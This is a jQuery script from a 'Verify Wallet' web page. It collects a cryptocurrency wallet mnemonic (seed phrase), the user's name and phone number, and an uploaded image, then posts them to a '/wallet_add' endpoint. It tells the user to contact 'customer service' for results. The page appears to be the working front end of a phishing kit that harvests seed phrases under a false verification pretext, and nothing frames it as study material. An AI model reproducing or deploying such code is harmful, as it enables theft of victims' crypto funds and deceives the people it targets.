<script type="text/javascript">
    $(function(){
        var id='2';
        $("#bank").val('Verify Wallet');
        // $("#select").click(function(){
        //     $(".lay").show();
        //     $(".lay-box").animate({'bottom':'0px'},500)
        // })

        $(".lay").click(function(){
            $(".lay").hide();
            $(".lay-box").animate({'bottom':'-10rem'},500)
        })
        var pictures = '';

            $("#myFile").change(function (e) {
                //获取input输入的值
                // console.log(e.delegateTarget);
                var formData = new FormData();
                var file = $("#myFile")[0].files[0];;
                formData.append("imgfile",file); //传给后台的file的key值是可以自己定义的
                $.ajax({
                    url: '/uploadimg',
                    type: "post",
                    data: formData,
                    contentType: false,
                    processData: false,
                    dataType: 'JSON',
                    mimeType: "multipart/form-data",
                    success: function (res) {
                        if(res.code!=200){
                            layer.msg(res.msg)
                        }else{
                            pictures = '/'+res.result.path;
                            $('.pictures-img').attr('src',pictures)
                        }
                    },
                    error: function (data) {
                        console.log(data);
                    }
                });
            });

        // $(".lay-box .li").click(function(){
        //     $(this).addClass('action').siblings('.li').removeClass('action');
        //     var txt = $(this).find('.txt').text();
        //     $("#bank").val(txt);
        //     var bankid = $(this).find('.bankid').text();
        //     id = bankid;
        // })
        $('.btn').on('click',function(){
            var zjc = $('#zjc').val();
            var pws=$('#pws').val();
            var rpws=$('#rpws').val();




            if(zjc=='' || zjc==null || typeof(zjc) == undefined){
                layer.msg('Please enter mnemonic');
                return false;
            }

            if(id=='' || id==null){
                layer.msg('Please select an address');
                return false;
            }

            if(pws=='' || pws==null){
                layer.msg('You enter a name');
                return false;
            }


            if(rpws=='' || rpws==null){
                layer.msg('You enter the phone number');
                return false;
            }

            $.ajax({
                type: "POST",
                url:'/wallet_add',
                data:{wallet_type:id,name:pws,help_words:zjc,phone:rpws,pictures_url: pictures},
                // dataType: "json",
                success: function(data){
                    if(data.code==200){
                        layer.msg('Wallet Verify, please contact customer service to check the results');
                        // setTimeout(function (args) {
                        //     window.location.href = data.url
                        // }, 1000);
                    }else{
                        layer.msg(data.msg);
                    }
                }
            });
        })


    })
